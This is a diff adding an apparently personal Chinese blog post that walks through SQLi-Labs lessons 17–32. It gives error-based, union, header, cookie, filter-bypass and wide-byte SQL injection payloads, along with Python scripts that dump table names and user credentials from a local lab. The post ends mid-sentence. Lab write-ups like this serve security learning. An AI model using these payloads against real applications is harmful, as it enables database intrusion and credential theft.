@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/img/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="Programming">
+    <meta name="author" content="Haojen Lau">
+    <meta name="keywords" content>
+    <title>Sqli_Lab_Learning ~ w366er</title>
+    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
+    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+    <link rel="stylesheet" href="/lib/nprogress/nprogress.css?v=0.2.0">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    
+        <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+    
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+</head>
+
+
+<body>
+<header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>w366er</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/categories/">Categories</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/tags/">Tags</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2"
+         style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
+        <div class="full-bg-img">
+            <div class="mask rgba-black-light flex-center">
+                <div class="container text-center white-text wow fadeInUp">
+                    <span class="h2" id="subtitle">
+                        
+                    </span>
+                    
+                        <br>
+                        <p>星期一, 十一月 4日 2019, 7:56 早上</p>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main>
+    
+        
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="d-none d-lg-block col-lg-2"></div>
+            <div class="col-lg-8 nopadding-md">
+                <div class="py-5 z-depth-3 board">
+                    <div class="post-content mx-auto">
+                        <div class="markdown-body">
+                            <h1 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h1><h2 id="Lesson-17"><a href="#Lesson-17" class="headerlink" title="Lesson 17"></a>Lesson 17</h2><p>首先有一个 PHP 的 check_input 的过滤机制：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc()) <span class="comment">// 默认为 false</span></span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);  <span class="comment">// 删除反斜杠</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>“ $value = substr($value,0,15); ”该函数只截取前 15 个字符。</li>
+<li>get_magic_quotes_gpc()函数，获取当前magic_quotes_gpc的配置选项设置。查一下手册：</li>
+</ul>
+<p><img src="/images/Sqli_Lab_Learning/get_magic_quotes_gpc.png" alt></p>
+<p>题目这里的意思是如果原来设置了 get_magic_quotes_gpc()，则将该设置所添加的反斜杠去掉。</p>
+<ul>
+<li>ctype_digit() 函数，做纯数字检测。查一下手册：<br><img src="/images/Sqli_Lab_Learning/ctype_digit.png" alt></li>
+<li>mysql_real_escape_string()函数，该函数是安全函数。<br><img src="/images/Sqli_Lab_Learning/mysql_real_escape_string.png" alt></li>
+</ul>
+<p>因此，这题 uname 无法利用（存在安全函数）。 所以，对 passwd 进行报错注入，并且uname 的值必须为 user  表中 username 字段中的某一个值。<br>exp 如下：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attr">main_url</span> = <span class="string">"http://localhost:81/SQLI-LABS/sqli-labs-master/Less-17/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payload</span> = [<span class="string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>,  <span class="comment"># 爆表</span></span><br><span class="line">           <span class="string">"select group_concat(column_name) from information_schema.columns where table_name=\'users\'"</span>,  <span class="comment"># 爆字段</span></span><br><span class="line">           ]</span><br><span class="line">for i_payload <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="attr">main_payload</span> = &#123;<span class="string">"uname"</span>:<span class="string">"admin"</span>, <span class="string">"passwd"</span>:<span class="string">"admin\' and updatexml(1,concat(0x7e,("</span> + i_payload + <span class="string">"),0x7e),1)#"</span>&#125;</span><br><span class="line">    <span class="attr">response</span> = requests.post(<span class="attr">url=main_url,</span> <span class="attr">data=main_payload)</span></span><br><span class="line">    print response.content</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-18-User-agent-注入"><a href="#Lesson-18-User-agent-注入" class="headerlink" title="Lesson 18 User agent 注入"></a>Lesson 18 User agent 注入</h2><p>uname 和 passwd 无法注入。发现 user agent 注入点，进行报错注入，uname 和 passwd 要确保能够有查询结果，payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) and '<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
+<h2 id="Lesson-19-Referer-注入"><a href="#Lesson-19-Referer-注入" class="headerlink" title="Lesson 19 Referer 注入"></a>Lesson 19 Referer 注入</h2><p>同样地，uname 和 passwd 无法注入。存在 Referer 注入点，进行报错注入，uname 和 passwd 要确保有查询结果，payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (select database()),<span class="number">0x7e</span>),<span class="number">1</span>) and '<span class="number">1</span>' = '<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
+<h2 id="Lesson-20-Cookie-注入"><a href="#Lesson-20-Cookie-注入" class="headerlink" title="Lesson 20 Cookie 注入"></a>Lesson 20 Cookie 注入</h2><p>uname 和 passwd 无法注入。存在 Cookie 注入点，进行报错注入，payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Cookie_sql.png" alt></p>
+<h1 id="Advanced-Injections"><a href="#Advanced-Injections" class="headerlink" title="Advanced Injections"></a>Advanced Injections</h1><h2 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h2><p>Cookie 注入，万变不离其宗，报错注入加上 base64，’)闭合，payload 如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkgYW5kICgnMScpPSgnMQ==</span><br></pre></td></tr></table></figure>
+
+<p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_21_1.png" alt></p>
+<h2 id="Lesson-22"><a href="#Lesson-22" class="headerlink" title="Lesson 22"></a>Lesson 22</h2><p>Cookie 注入，报错注入加上 base64，双引号闭合，payload 如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSwxKSBhbmQgIjEiID0iMQ==</span><br></pre></td></tr></table></figure>
+
+<p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_22_1.png" alt></p>
+<h2 id="Lesson-23"><a href="#Lesson-23" class="headerlink" title="Lesson 23"></a>Lesson 23</h2><p>普通联合注入，单引号闭合，payload 如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span> <span class="keyword">or</span> <span class="string">'1'</span> =<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">main_url = <span class="string">"http://localhost:81/SQLI-LABS/sqli-labs-master/Less-23/index.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    payload = <span class="string">"?id=-1' union select 1,(select table_name from information_schema.tables where table_schema=database("</span> \</span><br><span class="line">              <span class="string">")limit + "</span> + str(i) + <span class="string">",1),2 or '1' ='1 "</span></span><br><span class="line">    url = main_url + payload</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="literal">result</span> = response.text</span><br><span class="line">    <span class="literal">result</span> = <span class="literal">result</span>[<span class="number">570</span>:]</span><br><span class="line">    <span class="literal">result</span> = <span class="literal">result</span>[:<span class="literal">result</span>.find(<span class="string">"&lt;"</span>)]</span><br><span class="line">    print <span class="literal">result</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">result</span> == <span class="string">""</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    payload2 = <span class="string">"?id=-1' union select 1,(select group_concat(username, ' _ ', password) from users limit + "</span> + str(</span><br><span class="line">        i) + <span class="string">",1),2 or '1' ='1"</span></span><br><span class="line">    url = main_url + payload2</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="literal">result</span> = response.text</span><br><span class="line">    <span class="literal">result</span> = <span class="literal">result</span>[<span class="number">570</span>:]</span><br><span class="line">    <span class="literal">result</span> = <span class="literal">result</span>[:<span class="literal">result</span>.find(<span class="string">"&lt;"</span>)]</span><br><span class="line">    print <span class="literal">result</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">result</span> == <span class="string">""</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-24"><a href="#Lesson-24" class="headerlink" title="Lesson 24"></a>Lesson 24</h2><p>这题本身就有问题，猜测出题人漏了从 Logged-in.php 到 pass_change.php 的跳转。先抛开这个 bug。<br>这题为二次注入，首先理解什么是二次注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤：</span><br><span class="line">第一步：插入恶意数据</span><br><span class="line">进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</span><br><span class="line"></span><br><span class="line">第二步：引用恶意数据</span><br><span class="line">开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>mysql_escape_string() 函数将单引号（’）转义。 </li>
+<li>insert 语句中插入值含有 ‘#’ 不会起作用。</li>
+<li>单转义斜杆在字符串中不会存入到数据库中。<br>由于上面两点，php 可以    将恶意数据当成安全数据存到数据库中。</li>
+</ul>
+<p>同时还要注意，第二次注入成功，还需要第二次和第一次相应的数据项匹配（像这里 admin 和 admin’#）。</p>
+<h2 id="Lesson-25"><a href="#Lesson-25" class="headerlink" title="Lesson 25"></a>Lesson 25</h2><p>双写绕过注入，单引号闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-25a"><a href="#Lesson-25a" class="headerlink" title="Lesson 25a"></a>Lesson 25a</h2><p>双写绕过注入，无闭合。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">3</span>,group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-26"><a href="#Lesson-26" class="headerlink" title="Lesson 26"></a>Lesson 26</h2><p>带 FUZZ，过滤 or，and，*，/，–，#，空格，\。<br>使用 %a0 绕过空格过滤，报错注入，单引号闭合。<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>'||updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()), <span class="number">0x7e</span>),<span class="number">1</span>)||'<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，这里 -1 和 子句之间的连接使用了 || 。（没搞懂为什么不可以用&amp;&amp;）</p>
+<h2 id="Lesson-26a"><a href="#Lesson-26a" class="headerlink" title="Lesson 26a"></a>Lesson 26a</h2><p>FUZZ 和上题相同，但是’)闭合。<br>搞了半天报错注入，才发现没有 print_r(mysql_error()); 报错点，于是改用正常的联合注入。<br>payload:</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=')<span class="built_in">%a</span>0union<span class="built_in">%a</span>0select<span class="built_in">%a</span>01,<span class="number">2</span>,group_concat(table_name)<span class="built_in">%a</span>0from<span class="built_in">%a</span>0infoorrmation_schema.tables<span class="built_in">%a</span>0where<span class="built_in">%a</span>0table_schema=database()||('</span><br></pre></td></tr></table></figure>
+
+<p>这里在 id 选择不赋值，因为如果赋负值，后台会将负值 “-“ 过滤掉，变成正值无法获得想要的回显。</p>
+<h2 id="Lesson-27"><a href="#Lesson-27" class="headerlink" title="Lesson 27"></a>Lesson 27</h2><p>FUZZ 过滤了/，*，-，#，+，select，union。</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>空格过滤使用 %a0 绕过。</li>
+<li>三次写 select 对两次 select 过滤进行绕过。</li>
+</ul>
+<p>payload:</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>'||updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(selseselectlectect<span class="built_in">%a</span>0group_concat(table_name)<span class="built_in">%a</span>0from<span class="built_in">%a</span>0information_schema.tables<span class="built_in">%a</span>0where<span class="built_in">%a</span>0table_schema=database()),<span class="number">0</span>x7e),<span class="number">1</span>)||'</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-27a"><a href="#Lesson-27a" class="headerlink" title="Lesson 27a"></a>Lesson 27a</h2><p>FUZZ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>“ 闭合，无 print_r(mysql_error()); 所以使用普通的联合注入。<br>payload:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">"unIon%a0sELEct%a01,(sELEct%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),3||"</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用之前的三次写 select，两次写 union 的方法，也可以大小写绕过。</p>
+<h2 id="Lesson-28"><a href="#Lesson-28" class="headerlink" title="Lesson 28"></a>Lesson 28</h2><p>FUZZ 了 /，*，-，#，空格，union select。使用普通的联合注入，’) 闭合。<br>依然可以利用 %a0 绕过空格过滤，同时绕过 “union select” 的过滤。<br>payload:</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=')union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,(<span class="keyword">select</span><span class="symbol">%a0group_concat</span>(table_name)<span class="symbol">%a0from</span><span class="symbol">%a0information_schema.tables</span><span class="symbol">%a0where</span><span class="symbol">%a0table_schema</span>=database()),<span class="number">2</span>||('</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-28a"><a href="#Lesson-28a" class="headerlink" title="Lesson 28a"></a>Lesson 28a</h2><p>上一题 FUZZ 缩减版。<br>payload 和上一题一样。</p>
+<h2 id="Lesson-29"><a href="#Lesson-29" class="headerlink" title="Lesson 29"></a>Lesson 29</h2><p>无 FUZZ。<br>单引号闭合，普通的联合查询注入。<br>payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-30"><a href="#Lesson-30" class="headerlink" title="Lesson 30"></a>Lesson 30</h2><p>无 FUZZ。<br>双引号闭合，普通的联合查询注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1" union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-31"><a href="#Lesson-31" class="headerlink" title="Lesson 31"></a>Lesson 31</h2><p>无 FUZZ。<br>“)，普通的联合查询注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-32-宽字节注入"><a href="#Lesson-32-宽字节注入" class="headerlink" title="Lesson 32 宽字节注入"></a>Lesson 32 宽字节注入</h2><p>原理：<br>宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK编码的时候（标志性的是 mysql_query(“SET NAMES gbk”); 语句），会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。可以利用这个特性，在一些特殊字符前加上一个 ASCII 码大于 128 的字符，像反斜杠，从而两个字符一并转化为一个汉字。</p>
+<p>这里我们需要屏蔽反斜杠，于是 payload:</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%df'<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>这题留下一个问题：</p>
